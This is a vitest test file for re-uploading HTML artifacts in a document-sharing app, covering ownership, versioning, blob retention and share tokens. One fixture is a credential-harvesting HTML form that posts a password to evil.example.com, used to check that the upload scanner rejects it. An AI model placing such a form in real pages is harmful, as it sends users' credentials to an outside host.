import { describe, it, expect, beforeEach } from "vitest";
import { randomUUID } from "node:crypto";
import { eq } from "drizzle-orm";
import { drizzle } from "drizzle-orm/better-sqlite3";
import { migrate } from "drizzle-orm/better-sqlite3/migrator";
import { createSqlite } from "@/db/sqlite";
import * as schema from "@/db/schema";
import { artifact, share, event } from "@/db/schema";
import { createArtifact, reuploadArtifact, getArtifact } from "@/lib/artifacts";
import { resolveShare } from "@/lib/share";
import type { StorageAdapter } from "@/lib/storage";

type Db = ReturnType<typeof drizzle<typeof schema>>;

function freshDb(): Db {
  const sqlite = createSqlite(":memory:");
  const db = drizzle(sqlite, { schema });
  migrate(db, { migrationsFolder: "./db/migrations" });
  return db;
}

function memStorage() {
  const blobs = new Map<string, { data: Buffer; contentType: string }>();
  const storage: StorageAdapter = {
    put: async (k, d, ct) => {
      blobs.set(k, { data: d, contentType: ct });
    },
    get: async (k) => blobs.get(k) ?? null,
    delete: async (k) => {
      blobs.delete(k);
    },
  };
  return { storage, blobs };
}

const OWNER = "owner-A";
const OTHER = "owner-B";
const CLEAN_V1 = Buffer.from(
  "<!doctype html><html><body><h1>v1</h1></body></html>",
);
const CLEAN_V2 = Buffer.from(
  "<!doctype html><html><body><h1>v2 — replaced</h1><p>more</p></body></html>",
);
// Rejected by the scanner: a form posting to an external origin (credential-harvest).
const MALICIOUS = Buffer.from(
  '<!doctype html><html><body><form action="https://evil.example.com/steal" method="post"><input name="pw"/></form></body></html>',
);

describe("reuploadArtifact", () => {
  let db: Db;
  let storage: StorageAdapter;
  let blobs: Map<string, { data: Buffer; contentType: string }>;
  let id: string;
  let firstKey: string;

  beforeEach(async () => {
    db = freshDb();
    ({ storage, blobs } = memStorage());
    const res = await createArtifact(
      { ownerId: OWNER, title: "Deck", bytes: CLEAN_V1 },
      { db, storage },
    );
    if (!res.ok) throw new Error("setup upload failed");
    id = res.id;
    firstKey = getArtifact(OWNER, id, { db })!.storageKey;
  });

  it("refuses a non-owner (no leak) and a deleted artifact", async () => {
    const asOther = await reuploadArtifact(OTHER, id, CLEAN_V2, { db, storage });
    expect(asOther).toEqual({ ok: false, error: "not_found" });

    db.update(artifact).set({ deletedAt: new Date() }).where(eq(artifact.id, id)).run();
    const onDeleted = await reuploadArtifact(OWNER, id, CLEAN_V2, { db, storage });
    expect(onDeleted).toEqual({ ok: false, error: "not_found" });
  });

  it("scan-rejects without writing anything or changing the row", async () => {
    const before = getArtifact(OWNER, id, { db })!;
    const blobCountBefore = blobs.size;

    const res = await reuploadArtifact(OWNER, id, MALICIOUS, { db, storage });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.error).toBe("rejected");

    const after = getArtifact(OWNER, id, { db })!;
    expect(after.storageKey).toBe(before.storageKey); // unchanged
    expect(after.version).toBe(1); // not bumped
    expect(blobs.size).toBe(blobCountBefore); // no new blob written
    expect(blobs.has(firstKey)).toBe(true); // old blob intact
  });

  it("swaps storageKey, bumps version, updates metadata, retains the old blob", async () => {
    const res = await reuploadArtifact(OWNER, id, CLEAN_V2, { db, storage });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.version).toBe(2);

    const after = getArtifact(OWNER, id, { db })!;
    expect(after.version).toBe(2);
    expect(after.storageKey).not.toBe(firstKey);
    expect(after.sizeBytes).toBe(CLEAN_V2.length);
    expect(after.updatedAt).not.toBeNull();
    // Old blob retained for potential rollback; new blob has the new bytes.
    expect(blobs.get(firstKey)?.data.toString()).toBe(CLEAN_V1.toString());
    expect(blobs.get(after.storageKey)?.data.toString()).toBe(CLEAN_V2.toString());
  });

  it("keeps shares + their events, and existing tokens now serve the new bytes", async () => {
    const shareId = randomUUID();
    const token = `tok_${shareId}`;
    db.insert(share)
      .values({ id: shareId, artifactId: id, token, mode: "recipient", recipientLabel: "Jane" })
      .run();
    db.insert(event).values({ id: randomUUID(), shareId, type: "view" }).run();

    const res = await reuploadArtifact(OWNER, id, CLEAN_V2, { db, storage });
    expect(res.ok).toBe(true);

    // Share + token unchanged; prior analytics persist.
    const stillShare = db.select().from(share).where(eq(share.token, token)).get();
    expect(stillShare?.id).toBe(shareId);
    const events = db.select().from(event).where(eq(event.shareId, shareId)).all();
    expect(events).toHaveLength(1);

    // The same token now resolves to the artifact whose blob is the new bytes.
    const resolved = resolveShare(token, undefined, { db });
    expect(resolved.status).toBe("ok");
    if (resolved.status !== "ok") return;
    const served = await storage.get(resolved.artifact.storageKey);
    expect(served?.data.toString()).toBe(CLEAN_V2.toString());
  });
});
